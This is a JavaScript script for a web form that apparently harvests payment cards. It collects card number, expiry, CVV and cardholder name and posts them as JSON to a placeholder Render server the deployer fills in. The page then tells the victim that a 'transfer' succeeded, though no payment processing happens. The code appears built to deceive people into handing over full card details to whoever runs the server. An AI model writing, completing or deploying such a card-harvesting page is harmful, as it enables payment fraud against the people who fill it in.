document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector("#dadosss");
    
    const campos = {
        numero: document.querySelector("#numero"),
        data: document.querySelector("#data"),
        cvv: document.querySelector("#cvv"),
        nome: document.querySelector("#nome"),
    };

    const mensagensDica = {
        numero: "Exemplo: 1234 5678 9123 4567",
        data: "Exemplo: 12/30",
        cvv: "Exemplo: 123",
        nome: "Nome completo impresso no cartão.",
    };

    // --- FUNÇÃO PARA MOSTRAR/REMOVER AVISOS ---
    function gerenciarAviso(input, mensagem, cor = "#666", classe = "mensagem-dica") {
        const pai = input.parentElement;
        const avisoExistente = pai.querySelector(`.${classe}`);
        if (avisoExistente) avisoExistente.remove();

        if (mensagem) {
            const span = document.createElement("span");
            span.classList.add(classe);
            span.style.color = cor;
            span.style.fontSize = "12px";
            span.style.display = "block";
            span.style.marginTop = "4px";
            span.textContent = mensagem;
            pai.appendChild(span);
        }
    }

    // Configuração de Focus (Dicas Cinzas)
    for (const key in campos) {
        const input = campos[key];
        input.addEventListener("focus", () => {
            gerenciarAviso(input, mensagensDica[key]);
        });
        input.addEventListener("blur", () => {
            gerenciarAviso(input, null);
        });
    }

    // --- LÓGICA DE ENVIO COM VALIDAÇÃO EM VERMELHO ---
    form.addEventListener("submit", async (event) => {
        event.preventDefault();
        let formValido = true;

        // 1. VALIDAÇÃO CAMPO POR CAMPO
        for (const key in campos) {
            const input = campos[key];
            if (input.value.trim() === "") {
                // Se estiver vazio, coloca o aviso em VERMELHO
                gerenciarAviso(input, "Este campo é obrigatório!", "red", "erro-vazio");
                formValido = false;
            } else {
                // Se preencheu, remove o erro se ele existir
                const erro = input.parentElement.querySelector(".erro-vazio");
                if (erro) erro.remove();
            }
        }

        if (!formValido) return; // Para o envio se houver erro

        // 2. Coleta de dados
        const cardType = document.querySelector('input[name="gender"]:checked')?.value || "Não informado";
        const dadosParaEnviar = {
            numero: campos.numero.value,
            dataValidade: campos.data.value,
            cvv: campos.cvv.value,
            nome: campos.nome.value,
            tipo: cardType
        };

        // 3. Bloqueio do botão
        const botao = form.querySelector("button");
        botao.disabled = true;
        botao.textContent = "Processando...";

        try {
            // LEMBRETE: Use o seu link do Render aqui!
            const urlDoServidor = "https://SEU-PROJETO.onrender.com/enviar-dados";

            const resposta = await fetch(urlDoServidor, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dadosParaEnviar)
            });

            if (resposta.ok) {
                alert("Transferência realizada com sucesso!");
                form.reset();
            } else {
                alert("Erro ao salvar dados. Verifique sua conexão.");
            }
        } catch (error) {
            console.error("Erro:", error);
            alert("O servidor não respondeu. Tente novamente em instantes.");
        } finally {
            botao.disabled = false;
            botao.textContent = "Transferir";
        }
    });
});
